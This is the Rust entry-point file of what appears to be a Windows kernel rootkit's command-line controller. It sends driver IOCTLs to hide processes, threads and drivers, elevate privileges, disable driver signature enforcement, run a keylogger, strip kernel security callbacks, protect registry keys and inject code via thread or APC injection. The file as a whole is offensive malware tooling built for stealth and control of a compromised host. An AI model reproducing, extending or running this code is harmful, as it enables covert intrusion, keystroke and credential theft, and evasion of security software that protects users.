use {
    clap::Parser, 
    shared::ioctls::*,
    module::enumerate_module,
    cli::{Cli, Commands, ProcessCommands, ThreadCommands}, 
    driver::{dse, enumerate_driver, unhide_hide_driver}, 
    keylogger::keylogger, 
    process::{
        elevate_process, 
        enumerate_process, hide_unhide_process, 
        signature_process, terminate_process
    }, 
    thread::{enumerate_thread, hide_unhide_thread},
    callback::{enumerate_callback, remove_callback, restore_callback},
    injection::{injection_thread, injection_apc},
};

#[cfg(not(feature = "mapper"))]
mod registry;
mod callback;
mod cli;
mod driver;
mod process;
mod keylogger;
mod thread;
mod injection;
mod module;

#[cfg(not(feature = "mapper"))]
use {
    registry::{registry_protection_value, registry_protection_key},
    process::protection_process,
    thread::protection_thread,
};

fn main() {
    let args = Cli::parse();

    match &args.command {
        Commands::Process { sub_command } => match sub_command {
            ProcessCommands::Elevate { pid } => {
                println!("[+] Elevate Process: {pid}");
                elevate_process(Some(pid), IOCTL_ELEVATE_PROCESS);
            },
            ProcessCommands::Hide { pid } => {
                println!("[+] Hide Process: {pid}");
                hide_unhide_process(Some(pid), IOCTL_HIDE_UNHIDE_PROCESS, true);
            },
            ProcessCommands::Unhide { pid } => {
                println!("[+] UnHide Process: {pid}");
                hide_unhide_process(Some(pid), IOCTL_HIDE_UNHIDE_PROCESS, false);
            },
            ProcessCommands::Terminate { pid } => {
                println!("[+] Terminate Process: {pid}");
                terminate_process(Some(pid), IOCTL_TERMINATE_PROCESS);
            },
            ProcessCommands::Signature { pid, pt, sg } => {
                println!("[+] Signature Process: {pid}");
                signature_process(Some(pid), IOCTL_SIGNATURE_PROCESS, sg, pt);
            },
            #[cfg(not(feature = "mapper"))]
            ProcessCommands::Protection { pid, add, remove } => {
                println!("[+] Protection Process: {pid}");
                if *add {
                    protection_process(Some(pid), IOCTL_PROTECTION_PROCESS, true);
                } else if *remove {
                    protection_process(Some(pid), IOCTL_PROTECTION_PROCESS, false);
                } else {
                    eprintln!("[-] No action provided");
                }
            },
            ProcessCommands::Enumerate { list, type_ } => {
                println!("[+] Enumerate Process");
                if *list {
                    enumerate_process(IOCTL_ENUMERATION_PROCESS, type_);
                }
            }
        },
        Commands::Thread { sub_command } => match sub_command {
            ThreadCommands::Hide { tid } => {
                println!("[+] Hide Thread: {tid}");
                hide_unhide_thread(Some(tid), IOCTL_HIDE_UNHIDE_THREAD, true);
            },
            ThreadCommands::Unhide { tid } => {
                println!("[+] Unhide Thread: {tid}");
                hide_unhide_thread(Some(tid), IOCTL_HIDE_UNHIDE_THREAD, false);
            },
            #[cfg(not(feature = "mapper"))]
            ThreadCommands::Protection { tid	, add, remove } => {
                if *add {
                    protection_thread(Some(tid), IOCTL_PROTECTION_THREAD, true);
                } else if *remove {
                    protection_thread(Some(tid), IOCTL_PROTECTION_THREAD, false);
                } else {
                    eprintln!("[-] No action provided");
                }
            },
            ThreadCommands::Enumerate { list, type_ } => {
                println!("[+] Enumerate Thread");
                if *list {
                    enumerate_thread(IOCTL_ENUMERATION_THREAD, type_);
                }
            }
        },
        Commands::Driver { hide, unhide, list, name } => {
            if *hide {
                println!("[+] Hide Driver");
                match name {
                    Some(name) => unhide_hide_driver(IOCTL_HIDE_UNHIDE_DRIVER, name, true),
                    None => {
                        eprintln!("[-] No action provided for driver.");
                        return;
                    }
                }
            } else if *unhide {
                println!("[+] Unhide Driver");
                match name {
                    Some(name) => unhide_hide_driver(IOCTL_HIDE_UNHIDE_DRIVER, name, false),
                    None => {
                        eprintln!("[-] No action provided for driver.");
                        return;
                    }
                }
            } else if *list {
                println!("[+] Enumerate Driver");
                enumerate_driver(IOCTL_ENUMERATE_DRIVER);
            }
        },
        Commands::DSE { disable, enable } => {
            if *enable {
                println!("[+] Enable DSE");
                dse(IOCTL_ENABLE_DSE, true);
            } else if *disable {
                println!("[+] Disable DSE");
                dse(IOCTL_ENABLE_DSE, false);
            }
        }
        Commands::Keylogger { stop, start } =>  {
            if *start {
                println!("[+] Start Keylogger");
                keylogger(IOCTL_KEYLOGGER, true);
            } else if *stop {
                println!("[+] Stop Keylogger");
                keylogger(IOCTL_KEYLOGGER, false);
            }
        },
        #[cfg(not(feature = "mapper"))]
        Commands::Registry { name, add, remove, key } => {
            if *add && *remove {
                eprintln!("[-] Error: Both add and remove options cannot be specified at the same time");
            } else if *add {
                match name {
                    Some(ref name_value) => {
                        registry_protection_value(IOCTL_REGISTRY_PROTECTION_VALUE, name_value, &key, true);
                    },
                    None => {
                        registry_protection_key(IOCTL_REGISTRY_PROTECTION_KEY, &key, true);
                    }
                }
            } else if *remove {
                match name {
                    Some(ref name_value) => {
                        registry_protection_value(IOCTL_REGISTRY_PROTECTION_VALUE, name_value, &key, false);
                    },
                    None => {
                        registry_protection_key(IOCTL_REGISTRY_PROTECTION_KEY, &key, false);
                    }
                }
            } else {
                eprintln!("[-] Error: Either add or remove must be specified");
            }
        },
        Commands::Module { pid } => {
            enumerate_module(IOCTL_ENUMERATE_MODULE, pid);
        }
        Commands::Callback { list, remove, restore, callback } => {
            if *list {
                println!("[+] Enumerate Callback");
                enumerate_callback(IOCTL_ENUMERATE_CALLBACK, callback);
                return;
            }

            match (remove, restore) {
                (Some(index), None) => {
                    println!("[+] Remove Callback: {index}");
                    remove_callback(*index, IOCTL_REMOVE_CALLBACK, callback);
                },
                (None, Some(index)) => {
                    println!("[+] Restore Callback: {index}");
                    restore_callback(*index, IOCTL_RESTORE_CALLBACK, callback);
                },
                (Some(_), Some(_)) => {
                    eprintln!("[-] Error: Cannot remove and restore at the same time.");
                },
                (None, None) => {
                    eprintln!("[-] No action provided for callback.");
                },
            }
        },
        Commands::Injection { pid, path, type_ } => {
            match type_ {
                cli::Injection::Thread => {
                    injection_thread(IOCTL_INJECTION_THREAD, pid, path);
                },
                cli::Injection::APC => {
                    injection_apc(IOCTL_INJECTION_APC, pid, path);
                }
            }
        }
    }
}
